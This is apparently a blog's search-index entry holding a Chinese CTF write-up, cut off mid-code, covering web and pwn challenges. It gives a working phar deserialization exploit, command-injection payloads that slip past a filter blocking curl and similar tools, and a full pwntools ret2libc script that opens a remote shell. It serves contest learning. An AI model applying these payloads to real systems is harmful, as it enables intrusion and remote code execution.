<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2022第五空间网络安全大赛初赛Writeup</title>
      <link href="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
      <url>/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>By ACT Team. 2022.9.19</p></blockquote><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919190253199.png" alt="image-20220919190253199"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x1-5-web-BaliYun"><a href="#0x1-5-web-BaliYun" class="headerlink" title="0x1. 5_web_BaliYun"></a>0x1. 5_web_BaliYun</h3><p>扫目录发现<code>www.zip</code></p><p>index.php核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$down</span> = <span class="keyword">new</span> <span class="title function_ invoke__">check_img</span>();<span class="comment"># here</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$down</span>-&gt;<span class="title function_ invoke__">img_check</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$up</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$up</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename); <span class="comment"># here 2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];<span class="comment"># here</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123; <span class="comment"># here 1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显得phar反序列化,上传再phar包含即可，代码也给定了上传目录为<code>upload</code>，文件名未变。</p><p>更多有关phar反序列化可参考</p><blockquote><p><a href="https://xz.aliyun.com/t/6699">php反序列化拓展攻击详解–phar</a></p><p><a href="https://xz.aliyun.com/t/2958">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;filename = <span class="string">&#x27;file:///flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;Tao.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php --define phar.readonly=0 test.php</span><br><span class="line"><span class="built_in">mv</span> Tao.phar Tao.gif</span><br></pre></td></tr></table></figure><p>上传<code>Tao.gif</code>,之后<code>?img_name=phar://upload/Tao.gif</code>即可get flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ouo@GOTA:~$ curl -vv http://39.107.82.169:27417/index.php?img_name=phar://upload/Tao.gif | grep <span class="string">&quot;flag&quot;</span></span><br><span class="line">.........................................</span><br><span class="line">&gt; GET /index.php?img_name=phar://upload/Tao.gif HTTP/1.1</span><br><span class="line">&gt; Host: 39.107.82.169:27417</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Mon, 19 Sep 2022 10:42:08 GMT</span><br><span class="line">&lt; Server: Apache/2.4.25 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/5.6.40</span><br><span class="line">&lt; Vary: Accept-Encoding</span><br><span class="line">&lt; Content-Length: 1925</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt;</span><br><span class="line">.........................................</span><br><span class="line">                    flag&#123;s8HJQg5ftEJ9Kcc65Mn55K9XjRRgYVQg&#125;</span><br></pre></td></tr></table></figure><h3 id="0x2-5-web-letmeguess-1"><a href="#0x2-5-web-letmeguess-1" class="headerlink" title="0x2. 5_web_letmeguess_1"></a>0x2. 5_web_letmeguess_1</h3><p>题目提示弱口令，爆破得密码<code>admin123</code></p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919181148059.png" alt="image-20220919181148059"></p><p>登录后发现命令执行页面，fuzz一下，发现<code>%0A</code>可绕过执行命令,<code>%09</code>&#x3D;&gt;<code>    </code> (tab)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?ip=<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">0</span>Als HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.107</span>.<span class="number">75.148</span>:<span class="number">19304</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">86.0</span>.<span class="number">4240.198</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://39.107.75.148:19304/index.php?ip=ip</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=r4mutkqgni200nfu6ar3qj3jp7; td_cookie=3097567335</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919181336701.png" alt="image-20220919181336701"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 读取源代码</span><br><span class="line">?ip=127.0.0.1%0Apaste%09index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; &lt;?php</span><br><span class="line">    [<span class="number">1</span>] =&gt; </span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">    [<span class="number">3</span>] =&gt; </span><br><span class="line">    [<span class="number">4</span>] =&gt; // 开启Session</span><br><span class="line">    [<span class="number">5</span>] =&gt; </span><br><span class="line">    [<span class="number">6</span>] =&gt; <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    [<span class="number">7</span>] =&gt; </span><br><span class="line">    [<span class="number">8</span>] =&gt; </span><br><span class="line">    [<span class="number">9</span>] =&gt; </span><br><span class="line">    [<span class="number">10</span>] =&gt; // 首先判断Cookie是否有记住了用户信息</span><br><span class="line">    [<span class="number">11</span>] =&gt; </span><br><span class="line">    [<span class="number">12</span>] =&gt; <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    [<span class="number">13</span>] =&gt; </span><br><span class="line">    [<span class="number">14</span>] =&gt; <span class="comment"># 若记住了用户信息,则直接传给Session</span></span><br><span class="line">    [<span class="number">15</span>] =&gt; </span><br><span class="line">    [<span class="number">16</span>] =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    [<span class="number">17</span>] =&gt; </span><br><span class="line">    [<span class="number">18</span>] =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    [<span class="number">19</span>] =&gt; </span><br><span class="line">    [<span class="number">20</span>] =&gt; &#125;</span><br><span class="line">    [<span class="number">21</span>] =&gt; </span><br><span class="line">    [<span class="number">22</span>] =&gt; <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])) &#123;</span><br><span class="line">    [<span class="number">23</span>] =&gt; </span><br><span class="line">    [<span class="number">24</span>] =&gt; <span class="comment">// 若已经登录</span></span><br><span class="line">    [<span class="number">25</span>] =&gt; </span><br><span class="line">    [<span class="number">26</span>] =&gt; </span><br><span class="line">    [<span class="number">27</span>] =&gt; <span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line">    [<span class="number">28</span>] =&gt; </span><br><span class="line">    [<span class="number">29</span>] =&gt; <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    [<span class="number">30</span>] =&gt;     <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    [<span class="number">31</span>] =&gt;     <span class="variable">$m</span> = [];</span><br><span class="line">    [<span class="number">32</span>] =&gt;     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|&#x27;|:|&lt;|&gt;|less|more)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">    [<span class="number">33</span>] =&gt;         <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4<span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">    [<span class="number">34</span>] =&gt;         <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    [<span class="number">35</span>] =&gt;     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    [<span class="number">36</span>] =&gt;         <span class="variable">$res</span> = <span class="string">&#x27;Hacker,存在非法语句&#x27;</span>;</span><br><span class="line">    [<span class="number">37</span>] =&gt;     &#125;</span><br><span class="line">    [<span class="number">38</span>] =&gt; &#125;</span><br><span class="line">    [<span class="number">39</span>] =&gt; </span><br><span class="line">    [<span class="number">40</span>] =&gt; </span><br><span class="line">    [<span class="number">41</span>] =&gt; &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    [<span class="number">42</span>] =&gt; </span><br><span class="line">    [<span class="number">43</span>] =&gt; <span class="comment">// 若没有登录</span></span><br><span class="line">    [<span class="number">44</span>] =&gt; </span><br><span class="line">    [<span class="number">45</span>] =&gt; <span class="keyword">echo</span> <span class="string">&quot;您还没有登录,请&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;</span>;</span><br><span class="line">    [<span class="number">46</span>] =&gt; </span><br><span class="line">    [<span class="number">47</span>] =&gt; &#125;</span><br><span class="line">    [<span class="number">48</span>] =&gt; </span><br><span class="line">    [<span class="number">49</span>] =&gt; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则拦截如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|&#x27;|:|&lt;|&gt;|less|more)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) </span><br></pre></td></tr></table></figure><p>在当前目录中发现<code>kylin</code>，过滤也发现<code>kylin</code>，猜测flag在此目录下，但是由于<code>/</code>给拦截了，尝试进入目录后进行文件读取，但题目过滤了<code>kylin</code>,利用linux系统得特性，正则查看目录文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取kylin目录</span></span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">0</span>Als%<span class="number">09</span>ky???</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; flag.txt</span><br><span class="line">)</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#final payload</span></span><br><span class="line">?ip=127.0.0.1%0Acd%09ky???%0apaste%09fl*<span class="comment"># %09 =&gt; &#x27;    &#x27;(tab),其实$&#123;IFS&#125;也可以</span></span><br><span class="line">?ip=127.0.0.1%0Acd%09ky???%0apaste<span class="variable">$&#123;IFS&#125;</span>fl*</span><br><span class="line">?ip=127.0.0.1%0Aca<span class="string">&quot;&quot;</span>t<span class="variable">$&#123;IFS&#125;</span>$(<span class="keyword">fi</span><span class="string">&quot;&quot;</span>nd<span class="variable">$&#123;IFS&#125;</span>.)</span><br></pre></td></tr></table></figure><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919182506034.png" alt="image-20220919182506034"></p><p><img src="/2022/09/19/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220919182448011.png" alt="image-20220919182448011"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x1-5-1H3ll0Rop"><a href="#0x1-5-1H3ll0Rop" class="headerlink" title="0x1. 5_1H3ll0Rop"></a>0x1. 5_1H3ll0Rop</h3><p><strong>基础的ret2libc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./H3ll0Rop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.93.30.67&#x27;</span>,<span class="number">52705</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./H3ll0Rop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400753</span></span><br><span class="line"><span class="comment">#vuln = 0x400647</span></span><br><span class="line">vuln = <span class="number">0x4006CC</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(vuln)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me???&#x27;</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(binsh)+p64(system)+p64(vuln)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me???&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x1-5-简单的Base"><a href="#0x1-5-简单的Base" class="headerlink" title="0x1. 5_简单的Base"></a>0x1. 5_简单的Base</h3><p>题目给了一串密文<code>666c61677b57656c636f6d655f686572657d</code>, hex解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">&#x27;666c61677b57656c636f6d655f686572657d&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">flag&#123;Welcome_here&#125;</span><br></pre></td></tr></table></figure><h3 id="0x2-5-Misc-m-sTeR-0f"><a href="#0x2-5-Misc-m-sTeR-0f" class="headerlink" title="0x2. 5_Misc_m@sTeR_0f"></a>0x2. 5_Misc_m@sTeR_0f</h3><p>题目给了源代码，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 